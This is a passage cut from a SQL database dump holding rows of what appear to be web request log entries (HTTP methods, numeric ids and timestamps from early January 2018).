18:10:59',NULL),(472,305,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 21:41:06','2018-01-01 18:11:06',NULL),(473,306,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 21:41:17','2018-01-01 18:11:17',NULL),(474,307,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-01 22:11:20','2018-01-01 18:41:20',NULL),(475,308,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-01 22:27:29','2018-01-01 18:57:29',NULL),(476,309,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-01 22:27:39','2018-01-01 18:57:39',NULL),(477,310,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-01 22:27:49','2018-01-01 18:57:49',NULL),(478,311,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-01 22:28:00','2018-01-01 18:58:00',NULL),(479,312,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:28:10','2018-01-01 18:58:10',NULL),(480,313,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-01 22:28:34','2018-01-01 18:58:34',NULL),(481,314,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-01 22:28:45','2018-01-01 18:58:45',NULL),(482,315,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-01 22:28:56','2018-01-01 18:58:56',NULL),(483,316,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:29:08','2018-01-01 18:59:08',NULL),(484,317,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:29:19','2018-01-01 18:59:19',NULL),(485,318,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:29:28','2018-01-01 18:59:28',NULL),(486,319,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:29:39','2018-01-01 18:59:39',NULL),(487,320,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:29:51','2018-01-01 18:59:51',NULL),(488,321,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:29:59','2018-01-01 18:59:59',NULL),(489,322,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-01 22:30:08','2018-01-01 19:00:08',NULL),(490,323,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-01 22:30:17','2018-01-01 19:00:17',NULL),(491,324,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-01 22:30:29','2018-01-01 19:00:29',NULL),(492,325,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-01 22:30:38','2018-01-01 19:00:38',NULL),(493,326,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-01 22:30:50','2018-01-01 19:00:50',NULL),(494,327,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-01 22:31:02','2018-01-01 19:01:02',NULL),(495,328,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-01 22:31:11','2018-01-01 19:01:11',NULL),(496,329,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:32:16','2018-01-01 19:02:16',NULL),(497,330,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:32:24','2018-01-01 19:02:24',NULL),(498,331,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:32:36','2018-01-01 19:02:36',NULL),(499,332,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:32:50','2018-01-01 19:02:50',NULL),(500,333,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:33:03','2018-01-01 19:03:03',NULL),(501,334,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:33:14','2018-01-01 19:03:14',NULL),(502,335,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-01 22:33:24','2018-01-01 19:03:24',NULL),(503,336,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-01 22:34:42','2018-01-01 19:04:42',NULL),(504,337,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-02 01:53:24','2018-01-01 22:23:24',23),(505,338,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-02 02:53:29','2018-01-01 23:23:29',NULL),(506,339,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-02 02:53:51','2018-01-01 23:23:51',NULL),(507,340,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 03:12:16','2018-01-01 23:42:16',NULL),(508,341,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 03:12:16','2018-01-01 23:42:16',NULL),(509,342,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 04:31:07','2018-01-02 01:01:07',NULL),(510,343,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 04:36:54','2018-01-02 01:06:54',11),(511,344,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 04:38:19','2018-01-02 01:08:19',12),(512,345,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 06:11:59','2018-01-02 02:41:59',NULL),(513,346,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-02 07:36:15','2018-01-02 04:06:15',NULL),(514,347,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-02 09:05:08','2018-01-02 05:35:08',NULL),(515,348,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 09:36:22','2018-01-02 06:06:22',NULL),(516,349,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 10:18:58','2018-01-02 06:48:58',NULL),(517,350,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-02 10:41:40','2018-01-02 07:11:40',NULL),(518,351,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-02 10:53:38','2018-01-02 07:23:38',NULL),(519,352,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-02 10:53:40','2018-01-02 07:23:40',NULL),(520,353,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-02 10:53:43','2018-01-02 07:23:43',NULL),(521,354,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-02 10:53:46','2018-01-02 07:23:46',NULL),(522,355,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-02 10:53:48','2018-01-02 07:23:48',NULL),(523,356,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-02 10:53:50','2018-01-02 07:23:50',NULL),(524,357,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-02 10:53:53','2018-01-02 07:23:53',NULL),(525,358,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-02 10:53:55','2018-01-02 07:23:55',NULL),(526,359,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-02 10:53:58','2018-01-02 07:23:58',NULL),(527,360,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 10:54:00','2018-01-02 07:24:00',NULL),(528,361,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 10:54:03','2018-01-02 07:24:03',NULL),(529,362,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 10:54:06','2018-01-02 07:24:06',NULL),(530,363,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 10:54:09','2018-01-02 07:24:09',NULL),(531,364,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 10:54:11','2018-01-02 07:24:11',NULL),(532,365,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 10:58:24','2018-01-02 07:28:24',NULL),(533,366,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 11:44:49','2018-01-02 08:14:49',12),(534,367,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 11:44:49','2018-01-02 08:14:49',11),(535,368,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-02 13:43:01','2018-01-02 10:13:01',NULL),(536,369,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-02 13:49:57','2018-01-02 10:19:57',28),(537,370,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 13:53:40','2018-01-02 10:23:40',NULL),(538,371,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-02 14:13:46','2018-01-02 10:43:46',NULL),(539,372,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-02 14:36:08','2018-01-02 11:06:08',NULL),(540,373,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 17:43:00','2018-01-02 14:13:00',NULL),(541,374,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 18:20:05','2018-01-02 14:50:05',NULL),(542,375,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-02 18:45:19','2018-01-02 15:15:19',28),(543,376,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-02 19:01:11','2018-01-02 15:31:11',28),(544,377,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-02 19:25:03','2018-01-02 15:55:03',24),(545,378,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 20:56:16','2018-01-02 17:26:16',NULL),(546,379,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-02 20:56:20','2018-01-02 17:26:20',NULL),(547,380,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-02 20:56:23','2018-01-02 17:26:23',NULL),(548,381,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-02 20:56:26','2018-01-02 17:26:26',NULL),(549,382,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 21:47:06','2018-01-02 18:17:06',NULL),(550,383,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 21:47:39','2018-01-02 18:17:39',NULL),(551,384,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 21:48:48','2018-01-02 18:18:48',NULL),(552,385,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 21:49:13','2018-01-02 18:19:13',NULL),(553,386,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 21:56:00','2018-01-02 18:26:00',NULL),(554,387,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-02 21:56:26','2018-01-02 18:26:26',NULL),(555,388,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-02 21:56:50','2018-01-02 18:26:50',NULL),(556,389,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-02 23:15:24','2018-01-02 19:45:24',NULL),(557,390,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 02:05:12','2018-01-02 22:35:12',NULL),(558,391,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 02:35:29','2018-01-02 23:05:29',NULL),(559,392,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-03 02:35:34','2018-01-02 23:05:34',29),(560,393,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 02:35:38','2018-01-02 23:05:38',25),(561,394,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-03 02:35:41','2018-01-02 23:05:41',8),(562,395,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-03 02:35:43','2018-01-02 23:05:43',27),(563,396,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-03 02:35:46','2018-01-02 23:05:46',26),(564,397,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-03 02:35:48','2018-01-02 23:05:48',30),(565,398,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-03 02:35:51','2018-01-02 23:05:51',31),(566,399,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 02:35:53','2018-01-02 23:05:53',32),(567,400,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 02:35:56','2018-01-02 23:05:56',33),(568,401,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 02:35:58','2018-01-02 23:05:58',34),(569,402,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-03 03:50:17','2018-01-03 00:20:17',NULL),(570,403,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-03 03:50:23','2018-01-03 00:20:23',NULL),(571,404,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-03 03:50:31','2018-01-03 00:20:31',NULL),(572,405,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 03:58:23','2018-01-03 00:28:23',NULL),(573,405,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 03:58:26','2018-01-03 00:28:26',NULL),(574,405,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-03 03:58:29','2018-01-03 00:28:29',NULL),(575,405,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-03 03:58:31','2018-01-03 00:28:31',NULL),(576,405,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-03 03:58:34','2018-01-03 00:28:34',NULL),(577,406,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 04:04:47','2018-01-03 00:34:47',NULL),(578,407,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 06:45:11','2018-01-03 03:15:11',11),(579,408,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 08:21:15','2018-01-03 04:51:15',NULL),(580,409,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 08:22:37','2018-01-03 04:52:37',NULL),(581,410,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 10:07:58','2018-01-03 06:37:58',11),(582,411,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 10:07:58','2018-01-03 06:37:58',12),(583,412,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-03 10:15:54','2018-01-03 06:45:54',NULL),(584,413,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-03 10:15:57','2018-01-03 06:45:57',NULL),(585,414,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-03 10:15:59','2018-01-03 06:45:59',NULL),(586,415,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-03 10:16:02','2018-01-03 06:46:02',NULL),(587,416,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-03 10:16:04','2018-01-03 06:46:04',NULL),(588,417,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-03 10:16:06','2018-01-03 06:46:06',NULL),(589,418,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-03 10:16:09','2018-01-03 06:46:09',NULL),(590,419,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-03 10:16:11','2018-01-03 06:46:11',NULL),(591,420,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-03 10:16:14','2018-01-03 06:46:14',NULL),(592,421,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-03 10:16:16','2018-01-03 06:46:16',NULL),(593,422,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-03 10:16:19','2018-01-03 06:46:19',NULL),(594,423,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-03 10:16:21','2018-01-03 06:46:21',NULL),(595,424,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 10:16:23','2018-01-03 06:46:23',NULL),(596,425,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 10:16:26','2018-01-03 06:46:26',NULL),(597,426,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 10:16:28','2018-01-03 06:46:28',NULL),(598,427,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 10:16:30','2018-01-03 06:46:30',NULL),(599,428,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 10:16:33','2018-01-03 06:46:33',NULL),(600,429,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 10:16:35','2018-01-03 06:46:35',NULL),(601,430,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-03 12:53:21','2018-01-03 09:23:21',NULL),(602,431,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-03 12:53:24','2018-01-03 09:23:24',NULL),(603,432,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-03 12:53:28','2018-01-03 09:23:28',NULL),(604,433,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 13:15:05','2018-01-03 09:45:05',NULL),(605,434,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 16:36:43','2018-01-03 13:06:43',11),(606,435,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 16:38:03','2018-01-03 13:08:03',12),(607,436,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-03 17:50:05','2018-01-03 14:20:05',NULL),(608,437,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-03 18:55:45','2018-01-03 15:25:45',14),(609,438,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 18:58:50','2018-01-03 15:28:50',NULL),(610,439,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-03 19:02:48','2018-01-03 15:32:48',24),(611,440,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 19:37:54','2018-01-03 16:07:54',NULL),(612,441,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 20:10:24','2018-01-03 16:40:24',NULL),(613,442,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 20:22:50','2018-01-03 16:52:50',NULL),(614,443,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-03 20:30:07','2018-01-03 17:00:07',NULL),(615,444,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-03 21:11:23','2018-01-03 17:41:23',NULL),(616,445,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-03 21:11:26','2018-01-03 17:41:26',NULL),(617,446,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-03 21:11:29','2018-01-03 17:41:29',NULL),(618,447,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-03 21:11:32','2018-01-03 17:41:32',NULL),(619,448,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-03 21:11:35','2018-01-03 17:41:35',NULL),(620,449,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-03 21:11:37','2018-01-03 17:41:37',NULL),(621,450,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-03 21:11:41','2018-01-03 17:41:41',NULL),(622,451,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-03 21:11:43','2018-01-03 17:41:43',NULL),(623,452,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-03 21:11:46','2018-01-03 17:41:46',NULL),(624,453,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:11:49','2018-01-03 17:41:49',NULL),(625,454,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:11:51','2018-01-03 17:41:51',NULL),(626,455,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:11:54','2018-01-03 17:41:54',NULL),(627,456,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:11:57','2018-01-03 17:41:57',NULL),(628,457,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:12:00','2018-01-03 17:42:00',NULL),(629,458,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:12:02','2018-01-03 17:42:02',NULL),(630,459,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-03 21:12:04','2018-01-03 17:42:04',NULL),(631,460,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-03 22:03:17','2018-01-03 18:33:17',NULL),(632,461,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 01:11:23','2018-01-03 21:41:23',NULL),(633,462,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 03:19:51','2018-01-03 23:49:51',NULL),(634,463,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 03:21:00','2018-01-03 23:51:00',NULL),(635,464,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 04:25:45','2018-01-04 00:55:45',NULL),(636,465,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-04 04:49:02','2018-01-04 01:19:02',NULL),(637,466,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-04 04:49:09','2018-01-04 01:19:09',NULL),(638,467,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-04 04:49:18','2018-01-04 01:19:18',NULL),(639,468,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-04 05:57:20','2018-01-04 02:27:20',24),(640,469,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 05:57:21','2018-01-04 02:27:21',NULL),(641,470,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-04 07:46:33','2018-01-04 04:16:33',NULL),(642,471,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 08:45:05','2018-01-04 05:15:05',NULL),(643,473,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 10:03:43','2018-01-04 06:33:43',11),(644,472,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 10:03:43','2018-01-04 06:33:43',12),(645,474,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 10:39:10','2018-01-04 07:09:10',11),(646,475,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 11:15:01','2018-01-04 07:45:01',NULL),(647,476,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 13:57:03','2018-01-04 10:27:03',NULL),(648,477,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 16:25:53','2018-01-04 12:55:53',NULL),(649,478,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 19:19:47','2018-01-04 15:49:47',NULL),(650,479,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 19:33:21','2018-01-04 16:03:21',14),(651,479,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-04 19:36:40','2018-01-04 16:06:40',12),(652,480,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 19:38:53','2018-01-04 16:08:53',NULL),(653,481,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-04 22:10:47','2018-01-04 18:40:47',NULL),(654,482,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-04 22:11:46','2018-01-04 18:41:46',NULL),(655,483,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-04 22:11:57','2018-01-04 18:41:57',NULL),(656,484,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 22:22:18','2018-01-04 18:52:18',NULL),(657,485,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-04 23:58:40','2018-01-04 20:28:40',NULL),(658,486,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-05 00:09:52','2018-01-04 20:39:52',23),(659,487,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 00:52:01','2018-01-04 21:22:01',NULL),(660,488,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 01:00:27','2018-01-04 21:30:27',11),(661,489,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-05 02:10:12','2018-01-04 22:40:12',NULL),(662,490,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-05 02:10:14','2018-01-04 22:40:14',NULL),(663,491,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 02:32:59','2018-01-04 23:02:59',NULL),(664,492,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-05 02:33:02','2018-01-04 23:03:02',NULL),(665,493,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 02:33:06','2018-01-04 23:03:06',NULL),(666,494,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 02:33:14','2018-01-04 23:03:14',NULL),(667,495,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-05 02:33:18','2018-01-04 23:03:18',NULL),(668,496,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 02:33:21','2018-01-04 23:03:21',NULL),(669,497,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 03:31:40','2018-01-05 00:01:40',NULL),(670,498,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-05 04:24:25','2018-01-05 00:54:25',24),(671,499,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 04:29:07','2018-01-05 00:59:07',NULL),(672,500,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 08:03:00','2018-01-05 04:33:00',12),(673,501,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 08:05:26','2018-01-05 04:35:26',14),(674,501,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 08:09:40','2018-01-05 04:39:40',14),(675,502,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 09:37:15','2018-01-05 06:07:15',NULL),(676,503,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 09:53:18','2018-01-05 06:23:18',11),(677,504,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-05 10:18:51','2018-01-05 06:48:51',14),(678,505,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 10:20:15','2018-01-05 06:50:15',NULL),(679,506,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 10:20:17','2018-01-05 06:50:17',NULL),(680,507,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 10:20:18','2018-01-05 06:50:18',NULL),(681,508,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 10:22:01','2018-01-05 06:52:01',NULL),(682,509,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 10:23:40','2018-01-05 06:53:40',NULL),(683,504,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 10:31:57','2018-01-05 07:01:57',35),(684,504,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-05 10:34:57','2018-01-05 07:04:57',12),(685,510,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 11:27:19','2018-01-05 07:57:19',NULL),(686,511,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 11:30:27','2018-01-05 08:00:27',NULL),(687,512,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 12:27:57','2018-01-05 08:57:57',NULL),(688,513,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 12:31:23','2018-01-05 09:01:23',NULL),(689,513,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 12:31:31','2018-01-05 09:01:31',NULL),(690,514,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 13:00:10','2018-01-05 09:30:10',NULL),(691,515,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 13:06:40','2018-01-05 09:36:40',36),(692,516,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-05 13:41:44','2018-01-05 10:11:44',NULL),(693,517,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 14:10:34','2018-01-05 10:40:34',NULL),(694,518,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-05 14:30:13','2018-01-05 11:00:13',NULL),(695,519,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-05 14:30:26','2018-01-05 11:00:26',NULL),(696,520,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-05 14:30:42','2018-01-05 11:00:42',NULL),(697,521,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-05 14:30:49','2018-01-05 11:00:49',NULL),(698,522,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-05 14:30:56','2018-01-05 11:00:56',NULL),(699,523,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-05 14:31:13','2018-01-05 11:01:13',NULL),(700,524,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-05 14:31:24','2018-01-05 11:01:24',NULL),(701,525,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-05 15:36:08','2018-01-05 12:06:08',NULL),(702,526,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-05 15:45:10','2018-01-05 12:15:10',NULL),(703,526,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-05 15:45:14','2018-01-05 12:15:14',20),(704,527,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-05 15:47:20','2018-01-05 12:17:20',NULL),(705,527,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-05 15:47:32','2018-01-05 12:17:32',20),(706,527,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-05 15:47:33','2018-01-05 12:17:33',20),(707,527,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-05 15:47:40','2018-01-05 12:17:40',20),(708,527,11,NULL,'POST',18,0,0,0,0,13,'2018-01-05 15:48:26','2018-01-05 12:18:26',37),(709,528,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 15:53:57','2018-01-05 12:23:57',NULL),(710,529,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 16:42:26','2018-01-05 13:12:26',11),(711,530,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 16:42:57','2018-01-05 13:12:57',12),(712,531,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 17:10:42','2018-01-05 13:40:42',NULL),(713,532,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 18:09:09','2018-01-05 14:39:09',NULL),(714,533,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 18:28:36','2018-01-05 14:58:36',NULL),(715,534,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-05 19:18:28','2018-01-05 15:48:28',NULL),(716,535,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-05 19:18:37','2018-01-05 15:48:37',NULL),(717,536,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-05 19:18:54','2018-01-05 15:48:54',NULL),(718,537,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 19:59:20','2018-01-05 16:29:20',NULL),(719,538,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 19:59:26','2018-01-05 16:29:26',NULL),(720,539,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-05 20:01:35','2018-01-05 16:31:35',NULL),(721,540,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 20:17:02','2018-01-05 16:47:02',NULL),(722,541,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 20:36:38','2018-01-05 